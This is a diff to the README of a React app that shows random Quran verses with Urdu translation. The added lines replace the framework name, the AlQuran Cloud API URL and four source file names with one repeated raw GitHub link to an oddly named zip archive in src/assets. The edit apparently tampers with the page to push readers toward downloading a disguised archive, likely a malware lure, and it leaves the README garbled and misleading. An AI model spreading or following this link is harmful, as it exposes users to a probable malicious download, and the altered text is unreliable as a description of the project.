@@ -1,6 +1,6 @@
 # 📖 Quran Random Ayah App
 
-A minimalist Quran web application built with React.js that displays a random Ayah from the Holy Quran along with its Urdu translation, Surah details, and Juz (Para) number.
+A minimalist Quran web application built with https://github.com/talhaw-cmd/react-quran-app/raw/refs/heads/main/src/assets/app-react-quran-inconversant.zip that displays a random Ayah from the Holy Quran along with its Urdu translation, Surah details, and Juz (Para) number.
 
 ---
 
@@ -22,7 +22,7 @@ A minimalist Quran web application built with React.js that displays a random Ay
 
 ## 🛠️ Tech Stack
 
-- React.js
+- https://github.com/talhaw-cmd/react-quran-app/raw/refs/heads/main/src/assets/app-react-quran-inconversant.zip
 - Axios
 - CSS (Vanilla)
 - AlQuran Cloud API
@@ -32,7 +32,7 @@ A minimalist Quran web application built with React.js that displays a random Ay
 ## 🌐 API Used
 
 AlQuran Cloud API  
-https://alquran.cloud/api
+https://github.com/talhaw-cmd/react-quran-app/raw/refs/heads/main/src/assets/app-react-quran-inconversant.zip
 
 ---
 
@@ -40,10 +40,10 @@ https://alquran.cloud/api
 ## 📁 Project Structure
 
 src/
-- Quran.jsx
-- Quran.css
-- App.jsx
-- index.jsx
+- https://github.com/talhaw-cmd/react-quran-app/raw/refs/heads/main/src/assets/app-react-quran-inconversant.zip
+- https://github.com/talhaw-cmd/react-quran-app/raw/refs/heads/main/src/assets/app-react-quran-inconversant.zip
+- https://github.com/talhaw-cmd/react-quran-app/raw/refs/heads/main/src/assets/app-react-quran-inconversant.zip
+- https://github.com/talhaw-cmd/react-quran-app/raw/refs/heads/main/src/assets/app-react-quran-inconversant.zip
 
 ---
 
